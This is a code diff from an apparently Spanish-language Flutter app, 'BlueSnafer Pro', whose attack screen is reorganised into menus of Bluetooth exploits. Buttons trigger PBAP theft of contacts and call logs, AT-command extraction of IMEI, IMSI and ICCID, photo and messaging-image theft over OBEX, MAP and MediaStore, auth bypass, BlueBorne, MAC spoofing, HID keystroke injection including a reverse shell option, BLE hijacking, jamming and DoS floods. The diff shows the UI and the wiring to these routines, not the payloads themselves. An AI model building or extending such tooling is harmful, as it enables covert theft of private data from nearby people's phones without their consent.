-                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-                  Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
-                  const SizedBox(height: 4),
-                  Row(children: [
-                    Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(4)), 
-                      child: Text(device_utils.detectDeviceType(device).toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontSize: 9, fontWeight: FontWeight.bold))),
-                    const SizedBox(width: 8),
-                    Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 9, fontFamily: 'monospace')),
-                  ]),
-                ])),
-                if (isSelected) const Icon(Icons.check_circle, color: Colors.greenAccent, size: 20),
-              ]))),
-            );
-          },
-        );
-  }
-
-  Widget _buildHidTab() {
-    return ListView(padding: const EdgeInsets.all(16), children: [
-      _buildSectionTitle('INYECCIÓN HID', 'Keyboard emulation payloads'),
-      const SizedBox(height: 20),
-      _buildAttackCard('WINDOWS: NOTEPAD', 'Prueba básica', Colors.blue, () => _attack('hid', script: 'notepad'), type: 'hid'),
-      _buildAttackCard('WINDOWS: WIFI', 'Exfiltrar red', Colors.orange, () => _attack('hid', script: 'wifi'), type: 'hid'),
-      _buildAttackCard('MACOS: TERMINAL', 'Abrir consola', Colors.purple, () => _attack('hid', script: 'terminal'), type: 'hid'),
-      _buildAttackCard('LINUX: REVERSE', 'Remote Shell', Colors.red, () => _attack('hid', script: 'reverse'), type: 'hid'),
+            ),
+      ),
+      _buildTerminalBar(),
     ]);
   }
 
-   Widget _buildBtleJackTab() {
-     return ListView(padding: const EdgeInsets.all(16), children: [
-       _buildSectionTitle('BTLEJACK CORE', 'Exploits avanzados de BLE'),
-       const SizedBox(height: 20),
-       _buildAttackCard('SCAN', 'Enumeración', Colors.blue, () => _attack('btlejack', command: 'scan'), type: 'btlejack'),
-       _buildAttackCard('SNIFF', 'Captura de paquetes', Colors.purple, () => _attack('btlejack', command: 'sniff'), type: 'btlejack'),
-       _buildAttackCard('HIJACK', 'Takeover de sesión', Colors.red, () => _attack('btlejack', command: 'hijack'), type: 'btlejack'),
-       _buildAttackCard('JAM', 'Interrupción RF', Colors.deepOrange, () => _attack('btlejack', command: 'jam'), type: 'btlejack'),
-       const SizedBox(height: 8),
-       _buildSectionTitle('BLE 5.x MODERN EXPLOITS', 'Vulnerabilidades recientes (BLUR, SweynTooth)'),
-       const SizedBox(height: 12),
-       _buildAttackCard('🔶 BLUR ATTACK', 'CVE-2022-20361 - BLE connection hijack', Colors.redAccent, () => _attack('blur_attack'), type: 'blur_attack'),
-       _buildAttackCard('🔷 SWEYNTOOTH', 'CVE-2019-17053 - LLID/L2CAP injection', Colors.deepPurple, () => _attack('sweyntooth_attack'), type: 'sweyntooth_attack'),
-     ]);
-   }
+  bool _consoleExpanded = true;
 
-  Widget _buildDosTab() {
-    return ListView(padding: const EdgeInsets.all(16), children: [
-      _buildSectionTitle('ATAQUES DoS', 'Denegación de servicio'),
-      const SizedBox(height: 20),
-      _buildAttackCard('GATT FLOOD', 'Saturación', Colors.red, () => _attack('dos', command: 'gatt_flood'), type: 'dos'),
-      _buildAttackCard('L2CAP FLOOD', 'Buffer Crash', Colors.deepOrange, () => _attack('dos', command: 'l2cap_flood'), type: 'dos'),
-      _buildAttackCard('MTU CRASH', 'Invalid MTU', Colors.redAccent, () => _attack('dos', command: 'mtu_crash'), type: 'dos'),
-    ]);
+  // Rompe palabras largas sin espacios para que softWrap pueda dividirlas.
+  // Sin esto, rutas/payloads/MACs largos desbordan la consola (rayas).
+  String _wrapLogText(String s) {
+    const zwsp = '\u200B';
+    final buffer = StringBuffer();
+    var run = 0;
+    for (final ch in s.split('')) {
+      if (ch == ' ') {
+        run = 0;
+        buffer.write(ch);
+      } else {
+        run++;
+        buffer.write(ch);
+        if (run >= 60) {
+          buffer.write(zwsp);
+          run = 0;
+        }
+      }
+    }
+    return buffer.toString();
+  }
+
+  Widget _buildTerminalBar() {
+    return Container(
+      height: _consoleExpanded ? 280 : 40,
+      width: double.infinity,
+      margin: const EdgeInsets.fromLTRB(16, 0, 16, 0),
+      padding: const EdgeInsets.all(12),
+      decoration: const BoxDecoration(color: Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
+      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        Row(children: [
+          Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3), width: 1)), child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 12)),
+          const SizedBox(width: 8),
+          const Text('BLUESNAFER PRO CONSOLE', style: TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
+          const Spacer(),
+          if (_consoleExpanded) ...[
+            IconButton(icon: const Icon(Icons.save_alt, color: Colors.blue, size: 16), onPressed: _exportLogs, tooltip: 'Exportar logs', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
+            const SizedBox(width: 8),
+            IconButton(icon: const Icon(Icons.delete_outline, color: Colors.redAccent, size: 16), onPressed: () { setState(() => _log = ['SISTEMA OPERATIVO - STANDBY']); }, tooltip: 'Limpiar consola', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
+            const SizedBox(width: 8),
+          ],
+          IconButton(
+            icon: Icon(_consoleExpanded ? Icons.keyboard_arrow_down : Icons.keyboard_arrow_up, color: Colors.white38, size: 18),
+            onPressed: () => setState(() => _consoleExpanded = !_consoleExpanded),
+            tooltip: _consoleExpanded ? 'Minimizar consola' : 'Expandir consola',
+            padding: EdgeInsets.zero,
+            constraints: const BoxConstraints(),
+          ),
+        ]),
+        if (_consoleExpanded) ...[
+          const SizedBox(height: 4),
+          const Divider(color: Colors.white10, height: 1),
+          Expanded(
+            child: ListView.builder(
+              controller: _logScrollController,
+              itemCount: _log.length,
+              itemBuilder: (context, i) {
+                final entry = _log[i];
+                // Color-code by type
+                Color? textColor;
+                if (entry.startsWith('✅') || entry.contains('ÉXITO') || entry.contains('OK')) {
+                  textColor = Colors.greenAccent;
+                } else if (entry.startsWith('❌') || entry.contains('FALL') || entry.contains('ERROR')) {
+                  textColor = Colors.redAccent;
+                } else if (entry.startsWith('⚡') || entry.startsWith('🎯')) {
+                  textColor = Colors.orangeAccent;
+                } else if (entry.startsWith('📡')) {
+                  textColor = Colors.purpleAccent;
+                } else if (entry.startsWith('⚠️')) {
+                  textColor = Colors.amber;
+                } else if (entry.startsWith('💥')) {
+                  textColor = Colors.red;
+                } else {
+                  textColor = Colors.cyanAccent;
+                }
+                return Padding(
+                  padding: const EdgeInsets.only(bottom: 2),
+                  child: Text(_wrapLogText(entry), style: TextStyle(color: textColor, fontSize: 10, fontFamily: 'monospace'), softWrap: true),
+                );
+              },
+            ),
+          ),
+        ],
+      ]),
+    );
   }
 
   Widget _buildAiTab() {
     return ListView(padding: const EdgeInsets.all(16), children: [
-      // Panel de datos recolectados del objetivo
+      // Panel de datos recolectados del objetivo (siempre visible)
       if (_collectedData.isNotEmpty) ...[
         _buildDataPanel(),
-        const SizedBox(height: 16),
-      ],
-      // SDP Service Discovery
-      _buildSectionTitle('DESCUBRIMIENTO SDP', 'Servicios expuestos sin pairing'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.search, Colors.grey, null)
-      else
-        _buildExploitCard('🔍 SDP DISCOVER', 'Descubrir todos los servicios', Icons.search, Colors.cyanAccent, () => _sdpDiscover()),
-      if (_sdpServices.isNotEmpty) ...[
         const SizedBox(height: 12),
-        _buildSDPResultsPanel(),
       ],
-      const SizedBox(height: 16),
-      // PBAP Profile Extraction
-      _buildSectionTitle('EXTRACCION PBAP', 'Contactos e historial de llamadas'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.contacts, Colors.grey, null)
-      else ...[
-        _buildExploitCard('📇 EXTRAER CONTACTOS', 'Phone Book Access - telecom.pb', Icons.contacts, Colors.orange, () => _pbapExtract('contacts')),
-        _buildExploitCard('📞 HISTORIAL LLAMADAS', 'Incoming/Outgoing/Missed calls', Icons.phone, Colors.deepOrange, () => _pbapExtract('call_history')),
-        _buildExploitCard('📋 EXTRAER COMPLETO', 'Contactos + historial completo', Icons.folder_shared, Colors.amber, () => _pbapExtract('all')),
-      ],
-      if (_pbapContacts.isNotEmpty) ...[
-        const SizedBox(height: 12),
-        _buildPBAPResultsPanel(),
-      ],
-      const SizedBox(height: 16),
-      // OPP File Push
-      _buildSectionTitle('OPP FILE PUSH', 'Enviar archivos al objetivo'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.upload_file, Colors.grey, null)
-      else
-        _buildExploitCard('📤 PUSH FILE', 'Enviar archivo via OBEX OPP', Icons.upload_file, Colors.purple, () => _oppPushFile()),
-      const SizedBox(height: 16),
-      // OBEX File Exfiltration - OBJETIVO FINAL
-      _buildSectionTitle('EXTRACCION DE ARCHIVOS', 'BlueSnarfing - OBEX FTP'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildObexCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Colors.grey, null)
-      else
-        _buildObexCard('📂 ESCANEAR ARCHIVOS', 'Conectar via OBEX FTP', Colors.green, () => _obexScan()),
-      if (_obexFiles.isNotEmpty) ...[
-        const SizedBox(height: 12),
-        Container(
-          padding: const EdgeInsets.all(12),
-          decoration: BoxDecoration(
-            color: Colors.green[900]!.withOpacity(0.2),
-            borderRadius: BorderRadius.circular(12),
-            border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
-          ),
-          child: Column(
-            crossAxisAlignment: CrossAxisAlignment.start,
-            children: [
-              Row(
+      // ===== RECONOCIMIENTO =====
+      _buildCollapsibleSection(
+        title: '📡 RECONOCIMIENTO',
+        subtitle: 'Servicios expuestos (SDP)',
+        icon: Icons.search,
+        color: Colors.cyanAccent,
+        initiallyExpanded: _sdpServices.isNotEmpty,
+        children: [
+          _buildAutoRunCard('SDP DISCOVER', 'Ejecutar escaneo SDP ahora', onTap: () => _sdpDiscover()),
+          if (_sdpServices.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildSDPResultsPanel(),
+          ],
+        ],
+      ),
+      // ===== DATOS PERSONALES =====
+      _buildCollapsibleSection(
+        title: '📇 DATOS PERSONALES',
+        subtitle: 'Contactos, llamadas, identidad y SIM',
+        icon: Icons.contacts,
+        color: Colors.orange,
+        initiallyExpanded: _pbapContacts.isNotEmpty || _identityExtractionResult != null,
+        children: [
+          _buildAutoRunAction('PBAP contactos + llamadas', 'Ejecutar extracción PBAP completa', onTap: () => _pbapExtract('all'), icon: Icons.contacts),
+          _buildAutoRunAction('AT Identity (IMEI/IMSI)', 'Ejecutar extracción de identidad', onTap: () => _extractAtIdentity(), icon: Icons.fingerprint),
+          _buildAutoRunAction('SIM vía SAP (ICCID)', 'Ejecutar extracción SIM', onTap: () => _sapExtract(), icon: Icons.sim_card),
+          if (_pbapContacts.isNotEmpty || _pbapCalls.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildPBAPResultsPanel(),
+          ],
+          if (_identityExtractionResult != null) ...[
+            const SizedBox(height: 8),
+            _buildIdentityResultPanel(),
+          ],
+        ],
+      ),
+      // ===== GALERÍA DEL OBJETIVO =====
+      _buildCollapsibleSection(
+        title: '📸 GALERÍA DEL OBJETIVO',
+        subtitle: 'Fotos y capturas (OBEX FTP)',
+        icon: Icons.photo_library,
+        color: Colors.pinkAccent,
+        initiallyExpanded: _extractedImages.isNotEmpty,
+        children: [
+          _buildAutoRunCard('EXTRAER FOTOS vía OBEX FTP', 'Ejecutar extracción de galería ahora', onTap: () => _extractPhotos()),
+          if (_extractedImages.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildGalleryPanel(),
+          ],
+        ],
+      ),
+      // ===== EXTRACCIÓN MODERNA DE IMÁGENES =====
+      _buildCollapsibleSection(
+        title: '📸 EXTRACCIÓN MODERNA',
+        subtitle: 'MediaStore, GATT, OPP Server, MAP (alternativas a OBEX FTP)',
+        icon: Icons.cloud_download,
+        color: Colors.teal,
+        initiallyExpanded: _mediastoreEnhanced.isNotEmpty || _gattImages.isNotEmpty || _oppReceivedImages.isNotEmpty || _mapImages.isNotEmpty,
+        children: [
+          _buildAutoRunAction('MediaStore Enhanced (Android 10+)', 'Ejecutar MediaStore ahora', onTap: () => _mediastoreEnhancedExtract(), icon: Icons.photo_album),
+          _buildAutoRunAction('GATT Image Read (IoT/cámaras)', 'Ejecutar GATT image read', onTap: () => _gattImageRead(), icon: Icons.sensors),
+          _buildAutoRunAction('OPP Server Mode (target envía)', 'Abrir receptor OPP', onTap: () => _oppServerMode(), icon: Icons.call_received),
+          _buildAutoRunAction('MAP Image Extract (WhatsApp/Telegram)', 'Ejecutar MAP image extract', onTap: () => _mapImageExtract(), icon: Icons.message),
+          if (_mediastoreEnhanced.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildModernExtractionPanel('MediaStore', _mediastoreEnhanced, Colors.teal),
+          ],
+          if (_gattImages.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildModernExtractionPanel('GATT', _gattImages, Colors.cyan),
+          ],
+          if (_oppReceivedImages.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildModernExtractionPanel('OPP Server', _oppReceivedImages, Colors.green),
+          ],
+          if (_mapImages.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            _buildModernExtractionPanel('MAP', _mapImages, Colors.orange),
+          ],
+        ],
+      ),
+      // ===== TRANSFERENCIA DE ARCHIVOS =====
+      _buildCollapsibleSection(
+        title: '📤 TRANSFERENCIA DE ARCHIVOS',
+        subtitle: 'OBEX FTP, OPP, BLE y MediaStore',
+        icon: Icons.swap_vert,
+        color: Colors.greenAccent,
+        initiallyExpanded: _obexFiles.isNotEmpty,
+        children: [
+          _buildAutoRunAction('OBEX FTP scan · OPP Push · OBEX BLE · MediaStore', 'Integrado en el modo automático'),
+          if (_obexFiles.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            Container(
+              padding: const EdgeInsets.all(12),
+              decoration: BoxDecoration(
+                color: Colors.green[900]!.withValues(alpha: 0.2),
+                borderRadius: BorderRadius.circular(12),
+                border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
+              ),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
                 children: [
-                  Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
-                  const SizedBox(width: 8),
-                  Text('${_obexFiles.length} archivos encontrados', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
-                  const Spacer(),
-                  TextButton.icon(
-                    icon: const Icon(Icons.download, size: 14),
-                    label: const Text('EXPLORAR', style: TextStyle(fontSize: 11)),
-                    style: TextButton.styleFrom(foregroundColor: Colors.greenAccent),
-                    onPressed: () => _openFileBrowser(),
+                  Row(
+                    children: [
+                      Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
+                      const SizedBox(width: 8),
+                      Text('${_obexFiles.length} archivos encontrados', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
+                      const Spacer(),
+                      TextButton.icon(
+                        icon: const Icon(Icons.download, size: 14),
+                        label: const Text('EXPLORAR', style: TextStyle(fontSize: 11)),
+                        style: TextButton.styleFrom(foregroundColor: Colors.greenAccent),
+                        onPressed: () => _openFileBrowser(),
+                      ),
+                    ],
                   ),
+                  const SizedBox(height: 8),
+                  ..._obexFiles.take(10).map((f) => Padding(
+                    padding: const EdgeInsets.only(bottom: 2),
+                    child: Row(
+                      children: [
+                        Icon(f['type'] == 'directory' ? Icons.folder : Icons.insert_drive_file, color: f['type'] == 'directory' ? Colors.amber : Colors.cyanAccent, size: 12),
+                        const SizedBox(width: 4),
+                        Expanded(
+                          child: Text(f['name']?.toString() ?? '?', style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis),
+                        ),
+                        Text(f['size']?.toString() ?? '0', style: const TextStyle(color: Colors.white38, fontSize: 9)),
+                      ],
+                    ),
+                  )),
+                  if (_obexFiles.length > 10)
+                    Padding(
+                      padding: const EdgeInsets.only(top: 4),
+                      child: Text('... y ${_obexFiles.length - 10} más', style: const TextStyle(color: Colors.white38, fontSize: 9)),
+                    ),
                 ],
               ),
-              const SizedBox(height: 8),
-              ..._obexFiles.take(10).map((f) => Padding(
-                padding: const EdgeInsets.only(bottom: 2),
-                child: Row(
-                  children: [
-                    Icon(f['type'] == 'directory' ? Icons.folder : Icons.insert_drive_file, color: f['type'] == 'directory' ? Colors.amber : Colors.cyanAccent, size: 12),
-                    const SizedBox(width: 4),
-                    Expanded(
-                      child: Text(f['name']?.toString() ?? '?', style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis),
-                    ),
-                    Text(f['size']?.toString() ?? '0', style: const TextStyle(color: Colors.white38, fontSize: 9)),
-                  ],
-                ),
-              )),
-              if (_obexFiles.length > 10)
-                Padding(
-                  padding: const EdgeInsets.only(top: 4),
-                  child: Text('... y ${_obexFiles.length - 10} más', style: const TextStyle(color: Colors.white38, fontSize: 9)),
-                ),
-            ],
-          ),
-        ),
-      ],
-      const SizedBox(height: 16),
-       // OBEX OVER BLE (Modern)
-       _buildSectionTitle('OBEX OVER BLE', 'Transferencia sigilosa via BLE GATT'),
-       const SizedBox(height: 12),
-       if (_selectedDevice == null)
-         _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.bluetooth, Colors.grey, null)
-        else
-          _buildExploitCard('📁 OBEX BLE TRANSFER', 'Extraer archivos via OBEX sobre BLE', Icons.bluetooth, Colors.cyan, () => _attack('obex_ble_transfer', command: '/DCIM/Camera')),
-        // OPP PUSH - Envío forzado de archivos al víctima
-        if (_selectedDevice != null)
-          _buildExploitCard('📤 OPP PUSH', 'Inyectar archivo al dispositivo víctima', Icons.upload, Colors.teal, () => _attack('opp_push', command: '/sdcard/DCIM/Camera/bluesnafer_payload.jpg')),
-        const SizedBox(height: 16),
-        // MEDIASTORE HIJACK (Android 11+)
-       _buildSectionTitle('MEDIASTORE HIJACK', 'Extraer fotos via MediaStore (permisos locales)'),
-       const SizedBox(height: 12),
-       if (_selectedDevice == null)
-         _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.photo_library, Colors.grey, null)
-       else
-         _buildExploitCard('🖼️ ENUMERAR IMÁGENES', 'Listar todas las fotos del almacenamiento', Icons.photo_library, Colors.green, () => _attack('mediastore_enumerate')),
-       if (_selectedDevice != null)
-         _buildExploitCard('💾 EXTRAER ÚLTIMA IMAGEN', 'Extraer última imagen (requiere URI)', Icons.download, Colors.amber, () => _attack('mediastore_extract', command: '')),
-       const SizedBox(height: 16),
-       // AUTHENTICATION BYPASS TECHNIQUES (OffensiveCon 2025)
-       _buildSectionTitle('AUTH BYPASS', 'OffensiveCon 2025 - Bluetooth Auth Bypass'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.lock_open, Colors.grey, null)
-      else ...[
-        _buildExploitCard(
-          '⚡ QUICK CONNECT RACE',
-          'Race condition: L2CAP connect vs policy check',
-          Icons.timer,
-          Colors.redAccent,
-          () => _bypassQuickConnect(),
-        ),
-        _buildExploitCard(
-          '🎭 MAC SPOOF TRUST',
-          'Impersonate a bonded device by MAC',
-          Icons.masks,
-          Colors.deepPurple,
-          () => _bypassSpoofDevice(),
-        ),
-        _buildExploitCard(
-          '🔓 OBEX TRUST ABUSE',
-          'Exploit missing OBEX profile-level auth',
-          Icons.lock_reset,
-          Colors.orange,
-          () => _bypassOBEXTrust(),
-        ),
-      ],
-      const SizedBox(height: 16),
-      // RESULTS DASHBOARD - Shows all extracted data
+            ),
+          ],
+        ],
+      ),
+      // ===== AUTH BYPASS =====
+      _buildCollapsibleSection(
+        title: '🔓 AUTH BYPASS',
+        subtitle: 'OffensiveCon 2025 - Bluetooth Auth Bypass',
+        icon: Icons.lock_open,
+        color: Colors.redAccent,
+        children: [
+          _buildAutoRunAction('Quick Connect Race', 'Intentar bypas de Quick Connect', onTap: () => _bypassQuickConnect(), icon: Icons.bolt),
+          _buildAutoRunAction('MAC Spoof Trusted Device', 'Spoofear MAC de dispositivo confiable', onTap: () => _bypassSpoofDevice(), icon: Icons.wifi_find),
+          _buildAutoRunAction('OBEX Trust Abuse', 'Abusar de confianza OBEX', onTap: () => _bypassOBEXTrust(), icon: Icons.lock_open),
+        ],
+      ),
+      // ===== EXPLOITS AVANZADOS =====
+      _buildCollapsibleSection(
+        title: '🦠 EXPLOITS AVANZADOS',
+        subtitle: 'BlueBorne, Mirror, HID, Spoofing...',
+        icon: Icons.security,
+        color: Colors.red,
+        children: [
+          _buildAutoRunAction('BlueBorne', 'Ejecutar BlueBorne', onTap: () => _blueBorneAttack(), icon: Icons.bug_report),
+          _buildAutoRunAction('Mirror Profile', 'Ejecutar Mirror Profile', onTap: () => _mirrorProfile(), icon: Icons.copy_all),
+          _buildAutoRunAction('AT Injection', 'Inyección de comandos AT', onTap: () => _atInjection(), icon: Icons.terminal),
+          _buildAutoRunAction('Full Scan', 'Análisis completo de vulnerabilidades', onTap: () => _fullScan(), icon: Icons.search),
+          _buildAutoRunAction('BT Spoofing', 'Spoofear dispositivo', onTap: () => _btSpoofing(), icon: Icons.face_retouching_natural),
+          _buildAutoRunAction('HID Inject', 'Inyección de teclado HID', onTap: () => _hidInject(), icon: Icons.keyboard),
+          _buildAutoRunAction('Download File', 'Descargar archivo del objetivo', onTap: () => _downloadFile(), icon: Icons.download),
+          _buildAutoRunAction('OBEX FTP Scan', 'Escaneo de archivos OBEX', onTap: () => _obexScan(), icon: Icons.folder_open),
+          _buildAutoRunAction('OPP Push File', 'Enviar archivo vía OPP', onTap: () => _oppPushFile(), icon: Icons.upload_file),
+        ],
+      ),
+      // ===== RESULTS DASHBOARD =====
       if (_hasResults()) ...[
         _buildSectionTitle('📊 RESULTS DASHBOARD', 'Datos extraídos de ataques'),
         const SizedBox(height: 12),
         _buildResultsDashboard(),
-        const SizedBox(height: 16),
+        const SizedBox(height: 12),
       ],
-      // ADVANCED EXPLOITS
-      _buildSectionTitle('ADVANCED EXPLOITS', 'Full attack suite'),
-      const SizedBox(height: 12),
-      if (_selectedDevice == null)
-        _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.security, Colors.grey, null)
-      else
-        ListView(
-          shrinkWrap: true,
-          physics: const NeverScrollableScrollPhysics(),
-          children: [
-            _buildExploitCard('🦠 BLUEBORNE', 'CVE-2017-1000251 - Stack RCE', Icons.bug_report, Colors.red, () => _blueBorneAttack()),
-            const SizedBox(height: 8),
-            _buildExploitCard('📡 MIRROR PROFILE', 'Clone GATT database', Icons.content_copy, Colors.teal, () => _mirrorProfile()),
-            const SizedBox(height: 8),
-            _buildExploitCard('💉 AT INJECTION', 'AT commands via HFP', Icons.terminal, Colors.brown, () => _atInjection()),
-            const SizedBox(height: 8),
-            _buildExploitCard('🔎 FULL VULN SCAN', 'Complete security assessment', Icons.shield, Colors.indigo, () => _fullScan()),
-            const SizedBox(height: 8),
-            _buildExploitCard('🎭 BT SPOOFING', 'Clone device identity', Icons.fingerprint, Colors.pink, () => _btSpoofing()),
-            const SizedBox(height: 8),
-            _buildExploitCard('⌨️ HID INJECT', 'Direct keystroke injection', Icons.keyboard, Colors.lime, () => _hidInject()),
-            const SizedBox(height: 8),
-            _buildExploitCard('📥 DOWNLOAD FILE', 'Get file via OBEX', Icons.file_download, Colors.cyan, () => _downloadFile()),
-          ],
-        ),
-      const SizedBox(height: 16),
-      _buildSectionTitle('IA VULN ASSESSMENT', 'Inferencia TFLite'),
-      const SizedBox(height: 20),
+      // ===== VULNERABILITY ASSESSMENT =====
       if (_discoveryData.isNotEmpty) ...[
+        _buildSectionTitle('VULNERABILITY ASSESSMENT', 'Análisis heurístico'),
+        const SizedBox(height: 12),
         SmartSuggestionPanel(
           discoveryData: _discoveryData,
           onCommandSelected: (cmd) {
@@ -3799,19 +4356,56 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         ),
         const SizedBox(height: 20),
       ],
-      _buildAiModelCard('CLASSIFIER', 'Identidad', '99.3%'),
-      _buildAiModelCard('CVE_DETECTOR', 'CVE Analysis', 'ACTIVE'),
-      _buildAiModelCard('PREDICTOR', 'Confidence', 'ACTIVE'),
     ]);
+  }
+
+  // Sección colapsable para mantener la UI organizada y sin saturación
+  Widget _buildCollapsibleSection({
+    required String title,
+    required String subtitle,
+    required IconData icon,
+    required Color color,
+    bool initiallyExpanded = false,
+    required List<Widget> children,
+  }) {
+    return Container(
+      margin: const EdgeInsets.only(bottom: 10),
+      decoration: BoxDecoration(
+        color: Colors.white.withValues(alpha: 0.02),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: color.withValues(alpha: 0.15)),
+      ),
+      child: Theme(
+        data: Theme.of(context).copyWith(dividerColor: Colors.transparent),
+        child: ExpansionTile(
+          initiallyExpanded: initiallyExpanded,
+          leading: Container(
+            padding: const EdgeInsets.all(8),
+            decoration: BoxDecoration(color: color.withValues(alpha: 0.12), borderRadius: BorderRadius.circular(10)),
+            child: Icon(icon, color: color, size: 18),
+          ),
+          title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
+          subtitle: Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
+          iconColor: color,
+          collapsedIconColor: Colors.white38,
+          children: [
+            Padding(
+              padding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
+              child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: children),
+            ),
+          ],
+        ),
+      ),
+    );
   }
 
   Widget _buildDataPanel() {
     return Container(
       padding: const EdgeInsets.all(12),
       decoration: BoxDecoration(
-        color: Colors.green[900]!.withOpacity(0.2),
+        color: Colors.green[900]!.withValues(alpha: 0.2),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
+        border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
       ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
@@ -3836,10 +4430,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Widget _buildObexCard(String title, String subtitle, Color color, VoidCallback? onTap) {
     return Card(
       child: ListTile(
-        leading: Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.cloud_download, color: color, size: 24)),
+        leading: Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.cloud_download, color: color, size: 24)),
         title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
         subtitle: Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
-        trailing: onTap != null ? Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withOpacity(0.5))), child: Icon(Icons.bolt, color: color, size: 16)) : null,
+        trailing: onTap != null ? Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withValues(alpha: 0.5))), child: Icon(Icons.bolt, color: color, size: 16)) : null,
         onTap: onTap,
       ),
     );
@@ -4086,6 +4680,444 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     } catch (e) {
       _appendLog('💥 SDP Error: $e');
     }
+  }
+
+  // ========== EXTRACCIÓN DE IDENTIDAD (AT / SAP / IMEI) ==========
+
+  Future<void> _extractAtIdentity() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('🆔 AT Identity Extract → $displayName');
+    _appendLog('⏳ Probando canales RFCOMM (SPP/HFP)...');
+    setState(() => _identityExtractionResult = null);
+    try {
+      final result = await RealExploitService.extractDeviceIdentity(device);
+      setState(() => _identityExtractionResult = result);
+      if (result['success'] == true) {
+        final imei = result['imei'] ?? '';
+        final imsi = result['imsi'] ?? '';
+        final iccid = result['iccid'] ?? '';
+        final msisdn = result['msisdn'] ?? '';
+        final pbCount = result['phonebookCount'] ?? 0;
+        final smsCount = result['smsCount'] ?? 0;
+        _appendLog('✅ Canal AT en RFCOMM ${result['channel']}');
+        if (imei.isNotEmpty) {
+          final luhn = result['imeiLuhnValid'] == true ? ' (Luhn OK)' : ' (Luhn NO válido)';
+          _appendLog('📱 IMEI: $imei$luhn');
+          _collectedData.add('📱 [$displayName] IMEI: $imei');
+        }
+        if (imsi.isNotEmpty) {
+          _appendLog('🪪 IMSI: $imsi');
+          _collectedData.add('🪪 [$displayName] IMSI: $imsi');
+        }
+        if (iccid.isNotEmpty) {
